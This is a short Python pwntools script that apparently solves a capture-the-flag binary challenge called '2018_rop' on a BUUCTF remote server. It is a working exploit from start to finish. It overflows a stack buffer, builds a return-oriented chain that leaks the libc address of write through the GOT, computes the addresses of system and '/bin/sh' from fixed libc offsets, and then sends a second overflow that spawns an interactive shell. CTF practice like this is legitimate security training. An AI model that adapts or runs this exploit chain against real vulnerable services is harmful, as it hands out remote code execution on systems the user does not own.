from pwn import *


# p = process("./2018_rop")
p = remote("node4.buuoj.cn", 27168)
pro = ELF("./2018_rop")


write_p = pro.plt["write"]
write_g = pro.got["write"]
start = 0x080483C0 

def leak():
    pad = cyclic(0x88+0x4)
    pad += p32(write_p)+p32(start)
    pad += p32(1)+p32(write_g)+p32(4)
    p.send(pad)
    info = p.recv()

    return info

info = u32(leak())
print("write addr: ", hex(info))

# count offset
base = info-0xe56f0
system = base+0x3cd10
binsh = base+0x17b8cf

# attack
pad = cyclic(0x88+0x4)
pad += p32(system)+p32(0)+p32(binsh)
p.send(pad)

p.interactive()

